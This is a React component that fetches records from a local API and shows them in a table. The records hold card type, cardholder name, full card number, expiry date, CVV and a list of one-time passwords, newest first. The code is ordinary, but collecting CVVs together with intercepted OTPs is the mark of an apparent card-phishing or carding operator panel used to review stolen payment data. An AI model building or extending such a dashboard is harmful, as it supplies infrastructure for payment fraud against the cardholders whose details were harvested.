import axios from "axios";
import React from "react";
import { connect } from "react-redux";

class BasicTable extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      users: [],
      error: null,
    };
  }

  async componentDidMount() {
    try {
      const response = await axios.get("http://localhost:3001/api/cards", {
        headers: {
          'Content-Type': 'application/json',
        },
      });
      // Reverse the data to show the latest entries first
      const reversedData = response.data.reverse();
      console.log(reversedData); // Debug: Check reversed data in console
      this.setState({
        users: reversedData,
      });
    } catch (error) {
      console.error("There was an error fetching the data!", error);
      this.setState({ error: "There was an error fetching the data." });
    }
  }

  render() {
    const { users, error } = this.state;

    return (
      <div className="col-lg-12">
        <div className="card">
          <div className="header">
            <h2>
              User List{" "}
              <small>
                Basic example without any additional modification classes
              </small>
            </h2>
          </div>
          <div className="body table-responsive">
            {error ? (
              <div className="alert alert-danger" role="alert">
                {error}
              </div>
            ) : (
              <table className="table">
                <thead>
                  <tr>
                    {/* <th>#</th> */}
                    <th>Card Type</th>
                    <th>NAME</th>

                    <th>Card Number</th>
                    <th>Expiry Date</th>
                    <th>Cvv Number</th>

                    <th>Otp</th>
                  </tr>
                </thead>
                <tbody>
                  {users.length > 0 ? (
                    users.map((user, index) => (
                      <tr key={user._id}> {/* Use a unique key */}
                        {/* <th scope="row">{index + 1}</th> */}
                        <td>{user.cardType}</td>
                        <td>{user.name}</td>
                        <td>{user.cardNumber}</td>
                        <td>{user.expiryDate}</td>
                        <td>{user.cvvNumber}</td>

                        <td>
                          {user.otp.slice().reverse().map((otp, index) => (
                            <span key={index}>
                              {otp}
                              {index < user.otp.length - 1 && <br />}
                            </span>
                          ))}
                        </td>

                      </tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan="7">Loading...</td>
                    </tr>
                  )}
                </tbody>
              </table>
            )}
          </div>
        </div>
      </div>
    );
  }
}

const mapStateToProps = ({ mailInboxReducer }) => ({});

export default connect(mapStateToProps, {})(BasicTable);
